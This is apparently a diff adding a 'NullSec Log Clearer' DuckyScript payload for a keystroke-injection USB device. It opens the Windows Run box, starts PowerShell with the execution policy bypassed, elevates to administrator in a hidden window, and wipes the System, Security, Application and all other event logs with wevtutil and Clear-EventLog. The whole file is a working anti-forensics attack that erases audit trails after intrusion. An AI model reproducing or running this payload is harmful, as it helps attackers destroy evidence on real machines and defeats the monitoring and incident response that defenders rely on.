@@ -1,0 +1,8 @@
+REM NullSec Log Clearer
+REM Clears Windows event logs
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -c `"wevtutil cl System; wevtutil cl Security; wevtutil cl Application; Clear-EventLog -LogName *`"'"
+ENTER
